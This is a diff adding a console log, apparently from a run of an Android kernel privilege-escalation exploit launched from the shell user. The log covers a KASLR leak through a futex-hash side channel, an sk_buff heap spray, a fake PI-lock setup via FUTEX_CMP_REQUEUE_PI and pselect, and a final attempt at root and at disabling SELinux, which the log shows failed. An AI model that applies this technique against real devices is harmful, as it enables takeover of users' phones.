@@ -1,0 +1,62 @@
+[32m[+] [0mpreload starting pid=19953
+[32m[+] [0mstartup context pid=19953 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mbuild config pid=19953 label=onyx_leaf5_gv2.027 slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=19953 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 init_task=ffffff800b81c180 root_tg=ffffff800ba73cc0
+[32m[+] [0mkaslr_base=ffffff8008080000 (KIMAGE) slide=0000000000000000 init_task=ffffff800b81c180
+[DBG] pin_to_core done, preparing page...
+[DBG] prepare_kernel_page: start
+[DBG] prepare_kernel_page: mm_objs_per_slab=36
+[DBG] prepare_kernel_page: ctxs prepared
+[DBG] prepare_kernel_page: skb_buf=0xb40000767643e010
+[DBG] prepare_kernel_page: prepare_ctx done
+[DBG] prepare_kernel_page: spray_ctx done
+[DBG] prepare_kernel_page: calling kernelsnitch_setup(cpu=8, coll=2)...
+[KS] ENTER setup
+[KS] state mmap done: ks=0x76e8840000
+[KS] mm_struct set
+[KS] sizes set
+[KS] futex_hash_table_size=2048
+[KS] fields set, computing total_futexes...
+[KS] total_futexes=16384, mmaping times...
+[KS] times mmap done: 0x76e6f81000
+[KS] tids mmap done
+[KS] futexes mmap (FUTEX_SZ=68719476736)...
+[KS] futexes mmap done: 0x63f63e0000
+[33m[*] [0mfutex_init: cpus=8 raw=2048 hashsize=2048
+[DBG] prepare_kernel_page: kernelsnitch_setup done
+[33m[*] [0m[  1] thread done, tested 3417 candidates
+[33m[*] [0m[  0] thread done, tested 0 candidates
+[33m[*] [0m[  4] thread done, tested 0 candidates
+[33m[*] [0m[  2] thread done, tested 1 candidates
+[33m[*] [0m[  6] thread done, tested 920 candidates
+[33m[*] [0m[  5] thread done, tested 0 candidates
+[33m[*] [0m[  3] thread done, tested 0 candidates
+[33m[*] [0m[  7] thread done, tested 0 candidates
+[33m[*] [0mprepare_kernel_page leaked_mm=ffffff88002e2de8 base=ffffff88002e0000 mode=0
+[33m[*] [0mfake payload mode=0 write_shape=0 lock=ffffff88002e04d0 w0=ffffff88002e13a0 task=ffffff88002e2380 write_parent=454c4341524f4c47 write_right=0000000000000000 write_left=ffffff800381bf2c
+[33m[*] [0mlock owner=0x41 (follow-inc crash probe)
+[33m[*] [0mlock owner=0x41 (follow-inc crash probe)
+[33m[*] [0msk_buff reclaim send 1/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 2/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 3/4 ret=65536 errno=0
+[33m[*] [0msk_buff reclaim send 4/4 ret=65536 errno=0
+[32m[+] [0mheap_spray: page_base=ffffff88002e0000 (leaked mm_struct)
+[DBG] page_base=0xffffff88002e0000
+[33m[*] [0mowner: LOCK_PI f_pi_chain (EDEADLK edge)
+[33m[*] [0mmain: CMP_REQUEUE_PI ret=-1 errno=35 (Resource deadlock would occur) — want EDEADLK(35)
+[32m[+] [0mmain: EDEADLK — GhostLock pi_blocked_on primed
+[33m[*] [0mwaiter: WAIT_REQUEUE_PI ret=-1 errno=110
+[33m[*] [0mwaiter: pselect fake-lock reclaim (SHIFT=15)
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=15 page=ffffff88002e0000 fake_lock=ffffff88002e04d0 fake_w0=ffffff88002e13a0 fake_task=ffffff88002e2380 out5=ffffff800381bf24 out7=454c4341524f4c47 ex0=454c4341524f4c47 ex1=ffffff800b81c180 ex2=ffffff88002e04d0 ex3(prio)=0000000000000082 ex4(dl)=0000000000000000
+[33m[*] [0mconsumer sched_setattr seq=1 ret=0 errno=0 tid=25514
+[33m[*] [0mconsumer done seq=1 mode=sched_setattr fake_lock=ffffff88002e04d0 fake_fops=ffffff88002e0180
+[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
+[33m[*] [0muts oracle before sysname='Linux'
+[33m[*] [0muts oracle after sysname='Linux' hit=0 target=ffffff800381bf2c value=454c4341524f4c47
+[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9 calls=1 success=1
+[33m[*] [0mskip CFI probe (WRITE_ORACLE non-fops or SKIP_CFI_PROBE)
+[33m[*] [0mpselect route quality miss attempt=1/1 ret=0 expected=9 delay=0; refreshing FOPS page
+[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
+[33m[*] [0mowner: got f_pi_chain
+[32m[+] [0mpipe-physrw-summary pid=19953 done=0 root=0 kaslr=1 base=ffffff8008080000 slide=0000000000000000
+[32m[+] [0mpipe physrw pid=19953 done=0 root=0 kaslr=1 read_ok=0 write_ok=0 rw64=0/0 uid=4294967295->4294967295 sid=4294967295/4294967295->4294967295/4294967295 selinux=255->255 setgid=-1 setuid=-1 setenforce=-1/0
